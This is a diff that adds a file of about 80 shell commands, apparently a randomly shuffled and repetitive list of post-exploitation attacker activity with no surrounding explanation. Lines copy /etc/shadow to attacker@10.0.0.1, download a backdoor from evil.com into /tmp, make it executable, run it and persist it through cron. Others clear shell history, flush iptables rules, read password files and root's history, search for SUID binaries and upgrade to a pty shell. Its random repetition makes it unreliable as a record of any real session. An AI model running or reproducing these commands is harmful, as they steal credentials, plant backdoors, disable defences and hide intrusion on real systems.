@@ -1,0 +1,80 @@
+history -c
+scp /etc/shadow attacker@10.0.0.1:/loot/
+wget http://evil.com/backdoor -O /tmp/bd
+crontab -l
+iptables -P INPUT ACCEPT
+crontab -l
+export TERM=xterm
+id
+ssh-keygen -t rsa
+cat /etc/passwd
+echo '* * * * * /tmp/bd' | crontab -
+unset HISTFILE
+iptables -P INPUT ACCEPT
+unset HISTFILE
+cat /etc/shadow
+find / -writable 2>/dev/null
+ssh-keygen -t rsa
+unset HISTFILE
+uname -a
+wget http://evil.com/backdoor -O /tmp/bd
+hostname
+cat /root/.bash_history
+wget http://evil.com/backdoor -O /tmp/bd
+whoami
+netstat -tulpn
+export TERM=xterm
+ssh-keygen -t rsa
+uname -a
+chmod +x /tmp/bd
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+hostname
+find / -perm -4000 2>/dev/null
+export TERM=xterm
+netstat -tulpn
+/tmp/bd &
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+iptables -F
+nmap -p 22,80,443 target
+nmap -p 22,80,443 target
+/tmp/bd &
+crontab -l
+nmap -p 22,80,443 target
+netstat -tulpn
+netstat -tulpn
+/tmp/bd &
+nmap -sV 192.168.1.0/24
+id
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+nmap -p 22,80,443 target
+ssh-keygen -t rsa
+iptables -P INPUT ACCEPT
+scp /etc/shadow attacker@10.0.0.1:/loot/
+netstat -an
+unset HISTFILE
+iptables -F
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo su
+nmap -p 22,80,443 target
+hostname
+iptables -F
+nmap -sV 192.168.1.0/24
+unset HISTFILE
+find / -perm -4000 2>/dev/null
+unset HISTFILE
+chmod +x /tmp/bd
+cat /etc/passwd
+iptables -P INPUT ACCEPT
+iptables -F
+iptables -F
+cat /root/.bash_history
+export TERM=xterm
+netstat -tulpn
+whoami
+unset HISTFILE
+crontab -l
+whoami
+hostname
+ssh-keygen -t rsa
+ss -tulpn
+chmod +x /tmp/bd
